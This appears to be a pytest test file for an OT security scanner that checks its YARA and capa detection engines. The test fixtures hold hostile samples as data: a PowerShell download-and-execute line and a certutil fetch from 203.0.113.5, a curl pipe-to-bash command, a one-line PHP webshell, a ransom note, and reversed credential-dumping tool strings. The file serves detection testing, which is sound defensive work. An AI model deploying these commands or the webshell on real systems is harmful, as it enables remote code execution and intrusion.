"""YARA and capa engines: detection, compatibility (yara-python / YARA-X, capa JSON
formats), and stability (broken rules, timeouts, hangs, crashes, concurrency, caching).

Set OTINSPECT_ENGINES=require to fail instead of skip when an engine is missing (CI engines job).
Real capa runs need OTINSPECT_CAPA_RULES (and OTINSPECT_CAPA_SIGS for PE files) with pip-installed capa.
"""
from __future__ import annotations

import json
import os
import struct
import sys
import textwrap
import time

import pytest

from otinspect.cli import main
from otinspect.core.scanner import scan
from otinspect.engines import EngineConfig, capa_engine, status, yara_engine

REQUIRE = os.environ.get("OTINSPECT_ENGINES") == "require"
HERE = os.path.dirname(os.path.abspath(__file__))
SAMPLES = os.path.join(os.path.dirname(HERE), "samples")


def _backends() -> list[str]:
    found = []
    for name, mod in (("yara-python", "yara"), ("yara-x", "yara_x")):
        try:
            m = __import__(mod)
            if name == "yara-python" and not hasattr(m, "compile"):
                continue
            found.append(name)
        except ImportError:
            pass
    if not found and REQUIRE:
        pytest.fail("OTINSPECT_ENGINES=require but no YARA backend is installed")
    return found


BACKENDS = _backends()
needs_yara = pytest.mark.skipif(not BACKENDS, reason="no YARA backend installed")


@pytest.fixture(params=BACKENDS or ["none"])
def backend(request, monkeypatch):
    if request.param == "none":
        pytest.skip("no YARA backend installed")
    monkeypatch.setenv("OTINSPECT_YARA_BACKEND", request.param)
    assert yara_engine.backend_info()[0] == request.param
    return request.param


@pytest.fixture(autouse=True)
def _isolated_cache(tmp_path, monkeypatch):
    monkeypatch.setenv("OTINSPECT_CACHE", str(tmp_path / "cache"))


# ---------------------------------------------------------------------- test files
def pe(*strings: bytes) -> bytes:
    """Minimal PE header (enough for the identifier and YARA's PE check) plus strings."""
    hdr = bytearray(b"MZ" + b"\0" * 0x3A + struct.pack("<I", 0x40))
    hdr += b"PE\0\0" + b"\x4c\x01" + b"\0" * 18
    return bytes(hdr) + b"\0" * 64 + b"\0".join(strings) + b"\0" * 32


def elf(*strings: bytes) -> bytes:
    return b"\x7fELF\x02\x01\x01" + b"\0" * 57 + b"\0".join(strings) + b"\0" * 32


def R(b: bytes) -> bytes:
    """Strings of offensive tools are stored reversed so antivirus does not quarantine this test file."""
    return b[::-1]


EICAR = R(rb"*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\4[PA@%P!O5X")
MIMI = (R(b"sdrowssapnogol::aslrukes"), R(b"iwiklitneg"))

POSITIVES = {
    "eicar.com": (EICAR, "YARA-OTI_EICAR_Test_File", "info"),
    "remote_support.exe": (pe(b"AnyDesk Software GmbH"), "YARA-OTI_Remote_Access_Tool", "medium"),
    "tool.exe": (pe(*MIMI), "YARA-OTI_Credential_Dumping_Tool", "high"),
    "loader.dll": (pe(R(b"redaoLevitcelfeR")), "YARA-OTI_Offensive_Framework_Artifact", "high"),
    "s7tool.exe": (pe(b"Cli_PlcStop", b"Cli_Download", b"Cli_PlcColdStart"), "YARA-OTI_PLC_Control_Library", "medium"),
    "gateway.elf": (elf(b"libiec61850 1.5.1"), "YARA-OTI_ICS_Protocol_Library", "info"),
    "update.ps1": (b"$c = New-Object Net.WebClient\nIEX ($c.DownloadString('http://203.0.113.5/a'))\n",
                   "YARA-OTI_Script_Download_Execute", "medium"),
    "run.cmd": (b"certutil -urlcache -split -f http://203.0.113.5/x.exe x.exe\n", "YARA-OTI_Script_Download_Execute",
                "medium"),
    "install.sh": (b"curl -fsSL https://get.example.org/i.sh | sudo bash\n", "YARA-OTI_Script_Pipe_To_Shell", "low"),
    "cmd.php": (b"<?php if(isset($_GET['c'])) { system($_GET['c']); } ?>", "YARA-OTI_Webshell", "high"),
    "README_DECRYPT.txt": (b"All your files are encrypted. To get the decryption key pay in bitcoin "
                           b"at http://abcdefghijklmnop.onion\n", "YARA-OTI_Ransom_Note", "high"),
}
NEGATIVES = {
    "notes.txt": b"PLC stop planned for the outage. Download the program with TIA Portal.\n",
    "deploy.ps1": b"Get-ChildItem C:\\Backups | Where-Object Length -gt 0 | Remove-Item -WhatIf\n",
    "index.php": b"<?php echo htmlspecialchars($_GET['name'] ?? ''); ?>",
    "hmi.exe": pe(b"WinCC Runtime", b"Copyright Example Automation"),
    "rules.yar": b'rule x { strings: $a = "' + MIMI[0] + b'" $b = "' + MIMI[1] + b'" condition: all of them }',
}


BLOCKED: set = set()


def write(d, files: dict) -> None:
    """Write test files; on Windows an antivirus may block or remove some (recorded in BLOCKED)."""
    for name, v in files.items():
        data = v[0] if isinstance(v, tuple) else v
        p = os.path.join(d, name)
        try:
            with open(p, "wb") as fh:
                fh.write(data)
            with open(p, "rb") as fh:
                ok = fh.read() == data
        except OSError:
            ok = False
        if not ok:
            BLOCKED.add(name)


def yara_findings(res):
    return {(os.path.basename(x.source), x.rule): x for x in res.findings if x.rule.startswith("YARA-")}


# ---------------------------------------------------------------------- YARA: detection
def test_builtin_rules_compile(backend):
    rs = yara_engine.compile_rules([])
    assert rs.ok and rs.backend == backend and not rs.errors and rs.files == [yara_engine.BUILTIN_RULES]


def test_yara_true_positives_and_mapping(backend, tmp_path):
    write(tmp_path, POSITIVES)
    write(tmp_path, NEGATIVES)
    res = scan(str(tmp_path), engines=EngineConfig(yara=True))
    got = yara_findings(res)
    for name, (_, rule, sev) in POSITIVES.items():
        if name in BLOCKED or not os.path.exists(tmp_path / name):
            continue                                  # removed by a local antivirus
        assert (name, rule) in got, f"{name} not detected by {rule} ({backend})"
        f = got[(name, rule)]
        assert f.severity == sev
        assert f.iec62443, "IEC 62443 mapping missing"
        assert "offset" in f.message
    assert got[("remote_support.exe", "YARA-OTI_Remote_Access_Tool")].attack == ["T0822", "T0886"]
    assert got[("s7tool.exe", "YARA-OTI_PLC_Control_Library")].attack == ["T0858", "T0843", "T1692.001"]
    flagged = {n for n, _ in got}
    for name in NEGATIVES:
        assert name not in flagged, f"false positive on {name}: {[r for n, r in got if n == name]}"
    st = res.engines["yara"]
    present = [n for n in POSITIVES if os.path.exists(tmp_path / n) and n not in BLOCKED]
    assert st["backend"] == backend and st["matched_files"] == len(present) and st["errors"] == 0
    rec = next((f for f in res.files if f.path.endswith("tool.exe")), None)
    if rec is not None and "tool.exe" not in BLOCKED:
        assert rec.summary["yara"][0]["strings"] and MIMI[0] not in json.dumps(rec.summary).encode()


@needs_yara
def test_no_false_positives_on_bundled_samples():
    res = scan(SAMPLES, engines=EngineConfig(yara=True))
    assert not [x for x in res.findings if x.rule.startswith("YARA-")]
    assert res.engines["yara"]["scanned"] > 10 and res.engines["yara"]["errors"] == 0


@pytest.mark.skipif(len(BACKENDS) < 2, reason="needs both yara-python and yara-x")
def test_backends_agree(tmp_path, monkeypatch):
    write(tmp_path, POSITIVES)
    write(tmp_path, NEGATIVES)
    out = {}
    for b in BACKENDS:
        monkeypatch.setenv("OTINSPECT_YARA_BACKEND", b)
        out[b] = sorted(yara_findings(scan(str(tmp_path), engines=EngineConfig(yara=True))))
    assert out["yara-python"] == out["yara-x"]


# ---------------------------------------------------------------------- YARA: user rules and stability
def test_user_rules_metadata_and_broken_file(backend, tmp_path):
    rules = tmp_path / "rules"
    rules.mkdir()
    (rules / "site.yar").write_text(textwrap.dedent('''
        rule Site_Unapproved_Tool { meta: severity = "critical" description = "Unapproved tool"
          iec62443 = "SR 7.8" attack = "T0867" strings: $a = "UNAPPROVED-TOOL-MARKER" condition: $a }
        rule Site_Score { meta: score = 2 strings: $a = "SCORE-MARKER" condition: $a }
        rule Site_No_Meta { strings: $a = "NOMETA-MARKER" condition: $a }
    '''), encoding="utf-8")
    (rules / "broken.yara").write_text("rule broken { condition: this_does_not_exist }", encoding="utf-8")
    data = tmp_path / "data"
    data.mkdir()
    (data / "a.bin").write_bytes(b"\0UNAPPROVED-TOOL-MARKER\0SCORE-MARKER\0NOMETA-MARKER\0")
    res = scan(str(data), engines=EngineConfig(yara=True, yara_rules=[str(rules)], yara_builtin=False))
    got = {x.rule: x for x in res.findings if x.rule.startswith("YARA-")}
    assert got["YARA-Site_Unapproved_Tool"].severity == "high"
    assert got["YARA-Site_Unapproved_Tool"].iec62443 == ["SR 7.8"]
    assert got["YARA-Site_Unapproved_Tool"].attack == ["T0867"]
    assert "Unapproved tool" in got["YARA-Site_Unapproved_Tool"].message
    assert got["YARA-Site_No_Meta"].severity == "medium" and got["YARA-Site_No_Meta"].iec62443 == ["SR 3.2"]
    assert "YARA-Site_Score" in got
    assert any("broken.yara" in w for w in res.warnings)
    assert res.engines["yara"]["rule_files"] == 1


def test_missing_rules_path_and_missing_backend(tmp_path, monkeypatch):
    (tmp_path / "f.txt").write_text("x")
    if BACKENDS:
        res = scan(str(tmp_path), engines=EngineConfig(yara=True, yara_rules=[str(tmp_path / "nope")]))
        assert any("not found" in w for w in res.warnings)
    monkeypatch.setattr(yara_engine, "backend_info", lambda: ("", ""))
    res = scan(str(tmp_path), engines=EngineConfig(yara=True))
    assert any("pip install yara-python" in w for w in res.warnings)
    assert len(res.files) == 1 and not res.files[0].error


@needs_yara
def test_yara_timeout_size_limit_and_errors_do_not_stop_scan(tmp_path, monkeypatch):
    (tmp_path / "big.bin").write_bytes(b"\0" * (2 * 1048576))
    (tmp_path / "slow.bin").write_bytes(b"slow")
    (tmp_path / "boom.bin").write_bytes(b"boom")
    write(tmp_path, {"eicar.com": POSITIVES["eicar.com"]})
    real = yara_engine.scan_file

    def fake(rs, path, timeout=60):
        if path.endswith("slow.bin"):
            raise TimeoutError("YARA timed out after 1 s")
        if path.endswith("boom.bin"):
            raise ValueError("unexpected engine failure")
        return real(rs, path, timeout)
    monkeypatch.setattr(yara_engine, "scan_file", fake)
    res = scan(str(tmp_path), engines=EngineConfig(yara=True, max_file_mb=1))
    by = {os.path.basename(f.path): f for f in res.files}
    assert "larger than 1 MB" in by["big.bin"].summary["yara_note"]
    assert "timed out" in by["slow.bin"].summary["yara_note"]
    assert "ValueError" in by["boom.bin"].summary["engine_error"]
    assert any(x.rule == "YARA-OTI_EICAR_Test_File" for x in by["eicar.com"].findings)
    assert res.engines["yara"]["errors"] == 1 and res.engines["yara"]["skipped"] >= 1


def test_real_yara_timeout(backend, tmp_path):
    """A pathological rule on a large file must time out cleanly, not hang."""
    rules = tmp_path / "slow.yar"
    rules.write_text('rule Slow { condition: for all i in (0..filesize) : '
                     '(for all j in (0..filesize) : (uint8(i) != 0x41 or uint8(j) != 0x42)) }', encoding="utf-8")
    data = tmp_path / "data"
    data.mkdir()
    (data / "x.bin").write_bytes(b"\x01" * 400_000)
    t = time.monotonic()
    res = scan(str(data), engines=EngineConfig(yara=True, yara_rules=[str(rules)], yara_builtin=False, yara_timeout=1))
    assert time.monotonic() - t < 60
    rec = res.files[0]
    assert "timed out" in rec.summary.get("yara_note", "") or res.warnings, rec.summary


def test_yara_concurrency_is_deterministic(backend, tmp_path):
    for i in range(120):
        name, (data, _, _) = list(POSITIVES.items())[i % len(POSITIVES)]
        (tmp_path / f"{i:03d}_{name}").write_bytes(data)
    for i in range(80):
        (tmp_path / f"n{i:03d}.bin").write_bytes(os.urandom(4096))
    one = sorted(yara_findings(scan(str(tmp_path), workers=1, engines=EngineConfig(yara=True, workers=1))))
    many = sorted(yara_findings(scan(str(tmp_path), workers=8, engines=EngineConfig(yara=True, workers=8))))
    assert one == many and len(one) >= 100


@needs_yara
def test_yara_unicode_paths_empty_files_and_archives(tmp_path):
    d = tmp_path / "Trạm 110kV – sao lưu"
    d.mkdir()
    (d / "rỗng.bin").write_bytes(b"")
    (d / "phiếu.com").write_bytes(EICAR)
    import zipfile
    with zipfile.ZipFile(d / "goi.zip", "w") as z:
        z.writestr("inner/eicar.com", EICAR)
    res = scan(str(tmp_path), engines=EngineConfig(yara=True))
    names = {os.path.basename(x.source) for x in res.findings if x.rule == "YARA-OTI_EICAR_Test_File"}
    if (d / "phiếu.com").exists():
        assert "phiếu.com" in names
    assert not any(f.error for f in res.files if f.path.endswith(("rỗng.bin", "phiếu.com")))


# ---------------------------------------------------------------------- capa: fake capa for every platform
FAKE_CAPA = r'''
import json, os, subprocess, sys, time
mode = os.environ.get("FAKE_CAPA_MODE", "ok")
if "--version" in sys.argv:
    print("capa 9.1.0" if mode != "badversion" else "nonsense"); sys.exit(0)
path = sys.argv[-1]
log_dir = os.environ["FAKE_CAPA_LOG"]
os.makedirs(log_dir, exist_ok=True)
with open(os.path.join(log_dir, "call_%d_%d.txt" % (os.getpid(), time.time_ns())), "w") as fh:
    fh.write(path)
if mode == "hang":
    child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(120)"])
    with open(os.environ["FAKE_CAPA_CHILD"], "w") as fh:
        fh.write(str(child.pid))
    time.sleep(120)
if mode == "rc16": sys.exit(16)
if mode == "rc10": sys.stderr.write("rules not found\n"); sys.exit(10)
if mode == "crash": sys.stderr.write("Traceback: boom\n"); sys.exit(1)
if mode == "badjson": print("{not json"); sys.exit(0)
if mode == "old":
    rules = {"inject thread": {"meta": {"name": "inject thread", "namespace": "host-interaction/process/inject",
             "attack": ["Defense Evasion::Process Injection [T1055]"], "lib": False}}}
else:
    rules = {
      "inject shellcode using CreateRemoteThread": {"meta": {"name": "inject shellcode using CreateRemoteThread",
          "namespace": "host-interaction/process/inject", "lib": False,
          "attack": [{"id": "T1055", "tactic": "Defense Evasion", "technique": "Process Injection"}]}},
      "check for debugger via API": {"meta": {"name": "check for debugger via API",
          "namespace": "anti-analysis/anti-debugging/debugger-detection", "attack": [], "lib": False}},
      "persist via Run registry key": {"meta": {"name": "persist via Run registry key",
          "namespace": "persistence/registry/run", "attack": [{"id": "T1547.001"}], "lib": False}},
      "send HTTP request": {"meta": {"name": "send HTTP request", "namespace": "communication/http/client",
          "attack": [], "lib": False}},
      "contain loop": {"meta": {"name": "contain loop", "namespace": None, "lib": True}},
    }
print(json.dumps({"meta": {"analysis": {"format": "pe", "arch": "i386", "os": "windows"}}, "rules": rules}))
'''


def calls(log) -> list[str]:
    """Paths capa was called with (one file per call: appends are not atomic on Windows)."""
    if not log.exists():
        return []
    return [p.read_text() for p in log.iterdir()]


@pytest.fixture()
def fake_capa(tmp_path, monkeypatch):
    script = tmp_path / "fake_capa.py"
    script.write_text(FAKE_CAPA, encoding="utf-8")
    log = tmp_path / "capa_calls"
    monkeypatch.setenv("FAKE_CAPA_LOG", str(log))
    monkeypatch.setenv("FAKE_CAPA_CHILD", str(tmp_path / "child.pid"))
    monkeypatch.setenv("FAKE_CAPA_MODE", "ok")
    data = tmp_path / "data"
    data.mkdir()
    (data / "agent.exe").write_bytes(pe(b"hello"))
    (data / "sensor.elf").write_bytes(elf(b"x"))
    (data / "notes.txt").write_text("not an executable")
    return [sys.executable, str(script)], data, log


def _capa(cmd, **kw):
    return EngineConfig(capa=True, capa_cmd=cmd, **kw)


def test_capa_findings_from_current_json(fake_capa):
    cmd, data, log = fake_capa
    res = scan(str(data), engines=_capa(cmd))
    assert sorted(os.path.basename(c) for c in calls(log)) == ["agent.exe", "sensor.elf"]     # text file not analysed
    rec = next(f for f in res.files if f.path.endswith("agent.exe"))
    rules = {x.rule: x for x in rec.findings}
    inj = rules["CAPA-PROCESS-INJECTION"]
    assert inj.severity == "high" and "T1055" in inj.message and inj.iec62443 == ["SR 3.2"]
    assert rules["CAPA-PERSISTENCE"].severity == "medium" and "T1547.001" in rules["CAPA-PERSISTENCE"].message
    assert rules["CAPA-ANTI-ANALYSIS"].severity == "low"
    assert not any("HTTP" in x.message for x in rec.findings)                 # benign capability: summary only
    caps = rec.summary["capa"]
    assert caps["count"] == 4 and caps["format"] == "pe"                      # library rule dropped
    assert res.engines["capa"]["analysed"] == 2 and res.engines["capa"]["version"] == "9.1.0"


def test_capa_old_json_format(fake_capa, monkeypatch):
    cmd, data, _ = fake_capa
    monkeypatch.setenv("FAKE_CAPA_MODE", "old")
    res = scan(str(data), engines=_capa(cmd))
    f = next(x for x in res.findings if x.rule == "CAPA-PROCESS-INJECTION")
    assert "T1055" in f.message


@pytest.mark.parametrize("mode,expect", [("rc16", "unsupported file type"), ("crash", "capa exit 1"),
                                         ("badjson", "invalid JSON")])
def test_capa_errors_are_per_file_notes(fake_capa, monkeypatch, mode, expect):
    cmd, data, _ = fake_capa
    monkeypatch.setenv("FAKE_CAPA_MODE", mode)
    res = scan(str(data), engines=_capa(cmd))
    rec = next(f for f in res.files if f.path.endswith("agent.exe"))
    assert expect in rec.summary["capa_note"] and not rec.error
    assert not any(x.rule.startswith("CAPA-") for x in res.findings)


def test_capa_missing_rules_stops_early_with_one_warning(fake_capa, monkeypatch):
    cmd, data, log = fake_capa
    monkeypatch.setenv("FAKE_CAPA_MODE", "rc10")
    for i in range(6):
        (data / f"x{i}.exe").write_bytes(pe(b"x"))
    res = scan(str(data), engines=_capa(cmd, capa_workers=1))
    assert sum("rules not found" in w for w in res.warnings) == 1
    assert len(calls(log)) == 1


def test_capa_hang_is_killed_with_children(fake_capa, monkeypatch, tmp_path):
    cmd, data, _ = fake_capa
    monkeypatch.setenv("FAKE_CAPA_MODE", "hang")
    (data / "sensor.elf").unlink()
    t = time.monotonic()
    res = scan(str(data), engines=_capa(cmd, capa_timeout=3))
    assert time.monotonic() - t < 45
    rec = next(f for f in res.files if f.path.endswith("agent.exe"))
    assert "timed out" in rec.summary["capa_note"]
    pid = int((tmp_path / "child.pid").read_text())
    time.sleep(1)
    assert not _alive(pid), "capa child process survived the timeout"


def _alive(pid: int) -> bool:
    if os.name == "nt":
        import subprocess
        out = subprocess.run(["tasklist", "/FI", f"PID eq {pid}"], capture_output=True, text=True).stdout
        return str(pid) in out
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    try:                                   # zombie (killed, not yet reaped by init) counts as dead
        with open(f"/proc/{pid}/stat") as fh:
            return fh.read().split()[2] != "Z"
    except OSError:
        return True


def test_capa_cache_and_size_limit(fake_capa):
    cmd, data, log = fake_capa
    scan(str(data), engines=_capa(cmd))
    n = len(calls(log))
    res = scan(str(data), engines=_capa(cmd))
    assert len(calls(log)) == n                      # served from cache
    assert res.engines["capa"]["cached"] == 2
    assert any(x.rule == "CAPA-PROCESS-INJECTION" for x in res.findings)
    res = scan(str(data), engines=_capa(cmd, capa_cache=False, capa_max_mb=0.00001))
    assert res.engines["capa"]["skipped"] == 2 and len(calls(log)) == n


def test_capa_not_installed_or_broken(tmp_path, monkeypatch):
    (tmp_path / "a.exe").write_bytes(pe(b"x"))
    monkeypatch.delenv("OTINSPECT_CAPA", raising=False)
    res = scan(str(tmp_path), engines=_capa(str(tmp_path / "no-such-capa")))
    assert any("capa requested but not found" in w for w in res.warnings)
    monkeypatch.setenv("FAKE_CAPA_MODE", "badversion")
    script = tmp_path / "fc.py"
    script.write_text(FAKE_CAPA, encoding="utf-8")
    res = scan(str(tmp_path), engines=_capa([sys.executable, str(script)]))
    assert any("--version failed" in w for w in res.warnings)
    res = scan(str(tmp_path), engines=_capa([sys.executable, str(script)], capa_rules=str(tmp_path / "missing")))
    assert any("capa path not found" in w for w in res.warnings)


def test_classify_namespace_matching():
    caps = [{"name": "a", "namespace": "persistence", "attack": []},
            {"name": "b", "namespace": "persistencex/odd", "attack": []},
            {"name": "c", "namespace": "anti-analysis/anti-forensic/clear-logs", "attack": ["T1070.001"]}]
    g = {x["rule"]: x for x in capa_engine.classify(caps)}
    assert g["CAPA-PERSISTENCE"]["names"] == ["a"]
    assert g["CAPA-ANTI-FORENSICS"]["severity"] == "high" and g["CAPA-ANTI-FORENSICS"]["attack"] == ["T0872"]
    assert capa_engine.parse_capa_json({"x": 1}).ok is False


# ---------------------------------------------------------------------- capa: the real thing
def _real_capa_target() -> str | None:
    if os.name == "nt":
        p = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "whoami.exe")
    else:
        p = "/bin/true" if os.path.isfile("/bin/true") else "/usr/bin/true"
    return p if os.path.isfile(p) else None


def _real_capa_cfg() -> EngineConfig | None:
    rules = os.environ.get("OTINSPECT_CAPA_RULES", "")
    if not rules and not os.environ.get("OTINSPECT_CAPA"):     # standalone capa (embedded rules) or rules given
        return None
    cmd = capa_engine.find_capa(os.environ.get("OTINSPECT_CAPA"))
    if not cmd:
        return None
    return EngineConfig(capa=True, capa_cmd=cmd, capa_rules=rules, capa_sigs=os.environ.get("OTINSPECT_CAPA_SIGS", ""),
                        capa_timeout=600, capa_cache=False)


def test_real_capa_on_system_binary(tmp_path):
    cfg, target = _real_capa_cfg(), _real_capa_target()
    if cfg is None or target is None:
        if REQUIRE:
            pytest.fail("OTINSPECT_ENGINES=require but capa (with rules) is not available")
        pytest.skip("capa not installed / no rules configured")
    import shutil
    dst = tmp_path / os.path.basename(target)
    shutil.copy(target, dst)
    (tmp_path / "readme.txt").write_text("not analysed")
    res = scan(str(tmp_path), engines=cfg)
    assert not [w for w in res.warnings if "capa" in w], res.warnings
    rec = next(f for f in res.files if f.path.endswith(dst.name))
    assert "capa" in rec.summary, rec.summary.get("capa_note")
    assert rec.summary["capa"]["count"] > 0
    assert rec.summary["capa"]["format"] in ("pe", "elf")
    assert res.engines["capa"]["analysed"] == 1 and res.engines["capa"]["errors"] == 0


def test_real_capa_rejects_non_executable_gracefully(tmp_path):
    cfg = _real_capa_cfg()
    if cfg is None:
        if REQUIRE:
            pytest.fail("OTINSPECT_ENGINES=require but capa (with rules) is not available")
        pytest.skip("capa not installed / no rules configured")
    (tmp_path / "fake.exe").write_bytes(b"MZ" + os.urandom(2000))       # corrupt PE
    res = scan(str(tmp_path), engines=cfg)
    rec = res.files[0]
    assert "capa" not in rec.summary and rec.summary.get("capa_note") and not rec.error


# ---------------------------------------------------------------------- CLI and status
def test_cli_engines_and_scan_flags(tmp_path, capsys, fake_capa):
    cmd, data, _ = fake_capa
    write(data, {"cmd.php": POSITIVES["cmd.php"]})
    rc = main(["engines"])
    out = capsys.readouterr().out
    assert "YARA" in out and "capa" in out and rc in (0, 1)
    st = status(EngineConfig(capa_cmd=cmd))
    assert st["capa"]["available"] and st["capa"]["version"] == "9.1.0"
    rep = tmp_path / "r.json"
    yara_flag = ["--yara"] if BACKENDS else []
    rc = main(["scan", str(data), "-q", "--json", str(rep), "--capa", "--capa-path", str(tmp_path / "nope")] + yara_flag)
    assert rc == 0
    d = json.loads(rep.read_text(encoding="utf-8"))
    assert any("capa requested but not found" in w for w in d["warnings"])
    if BACKENDS:
        assert d["engines"]["yara"]["matched_files"] >= 1
        assert any(x["rule"] == "YARA-OTI_Webshell" for f in d["files"] for x in f["findings"])
        assert main(["scan", str(data), "-q", "--yara", "--fail-on", "high"]) == 2
    assert main(["scan", str(data), "-q", "--fail-on", "high"]) == 0


@needs_yara
def test_engine_findings_in_all_report_formats(tmp_path, fake_capa):
    from otinspect.report.export import to_csv, to_html, to_json
    from otinspect.report.interop import to_sarif
    cmd, data, _ = fake_capa
    write(data, {k: v for k, v in POSITIVES.items() if k in ("cmd.php", "update.ps1", "s7tool.exe")})
    res = scan(str(data), engines=EngineConfig(yara=True, capa=True, capa_cmd=cmd))
    rules = {x.rule for x in res.findings}
    assert {"YARA-OTI_Webshell", "CAPA-PROCESS-INJECTION"} <= rules
    sarif = tmp_path / "r.sarif"
    to_sarif(res, str(sarif))
    run = json.loads(sarif.read_text(encoding="utf-8"))["runs"][0]
    assert len(run["results"]) == len(res.findings)
    fps = [r["partialFingerprints"]["otinspect/v1"] for r in run["results"]]
    assert len(set(fps)) == len(fps)
    to_html(res, str(tmp_path / "r.html"))
    html = (tmp_path / "r.html").read_text(encoding="utf-8")
    assert "YARA-OTI_Webshell" in html and "SR 3.2" in html
    to_json(res, str(tmp_path / "r.json"))
    assert json.loads((tmp_path / "r.json").read_text(encoding="utf-8"))["engines"]["capa"]["analysed"] >= 1
    paths = to_csv(res, str(tmp_path / "csv"))
    assert any("YARA-OTI_Webshell" in open(p, encoding="utf-8-sig").read() for p in paths)
